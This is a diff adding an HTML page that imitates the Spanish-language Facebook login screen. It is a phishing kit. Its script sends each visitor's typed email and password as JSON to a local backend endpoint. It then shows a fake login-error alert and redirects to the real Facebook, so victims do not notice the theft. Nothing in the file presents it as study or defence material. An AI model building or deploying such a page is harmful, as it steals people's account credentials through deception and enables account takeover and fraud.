@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Iniciar sesión o registrarse</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Iniciar sesión</title>
+    <style>
+        html, body {
+            background: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #1c1e21;
+            min-height: 100vh;
+        }
+        .lang-bar {
+            text-align: center;
+            color: #6a6a6a;
+            font-size: 15px;
+            margin-top: 24px;
+            margin-bottom: 18px;
+            letter-spacing: 0.2px;
+            font-weight: 500;
+        }
+        .fb-logo-svg {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+        .fb-logo-svg svg {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: #1877f2;
+            display: block;
+            box-shadow: 0 2px 8px rgba(24,119,242,0.08);
+        }
+        main {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 60vh;
+            justify-content: flex-start;
+        }
+        .login-card {
+            width: 100%;
+            max-width: 370px;
+            background: #fff;
+            border-radius: 18px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            padding: 28px 18px 18px 18px;
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+            width: 100%;
+        }
+        label {
+            font-size: 15px;
+            margin-bottom: 6px;
+            color: #1c1e21;
+            font-weight: 500;
+            display: block;
+        }
+        .input-fb {
+            width: 100%;
+            padding: 16px 14px;
+            border-radius: 22px;
+            border: 1.5px solid #ddd;
+            background: #f5f6f7;
+            font-size: 16px;
+            color: #222;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            box-sizing: border-box;
+        }
+        .input-fb:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #1877f233;
+            outline: 2px solid #1877f2;
+        }
+        .fb-login-btn {
+            width: 100%;
+            padding: 16px 0;
+            border-radius: 22px;
+            background: #1877f2;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            margin-top: 4px;
+            transition: background 0.2s;
+            outline: none;
+        }
+        .fb-login-btn:disabled {
+            background: #b3cdfb;
+            cursor: not-allowed;
+        }
+        .fb-login-btn:focus {
+            outline: 2px solid #1877f2;
+        }
+        .fb-forgot {
+            text-align: center;
+            color: #222;
+            font-size: 13px;
+            margin: 10px 0 0 0;
+            text-decoration: none;
+            display: block;
+            font-weight: 400;
+        }
+        .fb-forgot:focus, .fb-forgot:hover {
+            text-decoration: underline;
+            outline: none;
+        }
+        .fb-create-btn {
+            width: 100%;
+            padding: 16px 0;
+            border-radius: 22px;
+            background: #fff;
+            color: #1877f2;
+            font-size: 17px;
+            font-weight: bold;
+            border: 2px solid #1877f2;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s, color 0.2s;
+            outline: none;
+        }
+        .fb-create-btn:focus {
+            outline: 2px solid #1877f2;
+        }
+        .fb-create-btn:hover {
+            background: #f0f2f5;
+        }
+        .fb-create-page {
+            margin: 28px auto 0 auto;
+            width: 100%;
+            max-width: 370px;
+            text-align: center;
+            font-size: 13px;
+            color: #1c1e21;
+            padding-bottom: 24px;
+        }
+        @media (max-width: 500px) {
+            .login-card, .fb-create-page {
+                max-width: 98vw;
+                border-radius: 0;
+                box-shadow: none;
+                padding-left: 2vw;
+                padding-right: 2vw;
+            }
+            .fb-logo-svg svg {
+                width: 54px;
+                height: 54px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="lang-bar">Español</div>
+    <div style="height: 70px;"></div>
+    <main>
+        <div class="fb-logo-img" aria-hidden="true">
+            <img src="../backend/logo.png" alt="Facebook" width="60" height="60" style="display:block;border-radius:50%;box-shadow:0 2px 8px rgba(24,119,242,0.08);background:#1877f2;" />
+        </div>
+        <div style="height: 150px;"></div>
+        <section class="login-card">
+            <form id="loginForm" method="post" action="#" autocomplete="on">
+                <div>
+                    <input class="input-fb" type="text" id="email" name="email" autocomplete="username" required aria-label="Celular o correo electrónico" placeholder="Celular o correo electrónico">
+                </div>
+                <div>
+                    <input class="input-fb" type="password" id="password" name="password" autocomplete="current-password" required aria-label="Contraseña" placeholder="Contraseña">
+                </div>
+                <button type="submit" class="fb-login-btn" id="loginBtn" aria-label="Iniciar sesión">Iniciar sesión</button>
+            </form>
+            <a href="#" class="fb-forgot" tabindex="0">¿Olvidaste tu contraseña?</a>
+            <div style="height: 180px;"></div>
+            <button type="button" class="fb-create-btn" aria-label="Crear cuenta nueva">Crear cuenta nueva</button>
+            <div style="display:flex;flex-direction:column;align-items:center;margin-top:32px;gap:8px;">
+                <img src="../backend/meta.png" alt="Meta" width="70" height="14" style="margin-bottom:4px;opacity:0.8;" />
+                <div style="color:#888;font-size:13px;display:flex;gap:18px;justify-content:center;">
+                    <span>Información</span>
+                    <span>Ayuda</span>
+                    <span>Más</span>
+                </div>
+            </div>
+        </section>
+        <div class="fb-create-page">
+            <a href="#" style="color:#1877f2; font-weight:bold; text-decoration:none;">Crea una página</a> para una celebridad, una marca o un negocio.
+        </div>
+    </main>
+    <script>
+        // Accesibilidad: focus visible en tab
+        document.querySelectorAll('button, .fb-forgot').forEach(el => {
+            el.addEventListener('keyup', e => {
+                if (e.key === 'Tab') el.style.outline = '2px solid #1877f2';
+            });
+            el.addEventListener('blur', e => {
+                el.style.outline = '';
+            });
+        });
+
+    // Validación de campos eliminada para que el botón siempre esté azul y habilitado
+
+        // Envío del formulario
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Cargando...';
+            // Guardar en backend
+            await fetch('http://localhost:3000/api/register', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email.value, password: password.value })
+            });
+            setTimeout(() => {
+                alert('Error inicia sesion de nuevo');
+                window.location.href = 'https://www.facebook.com/';
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
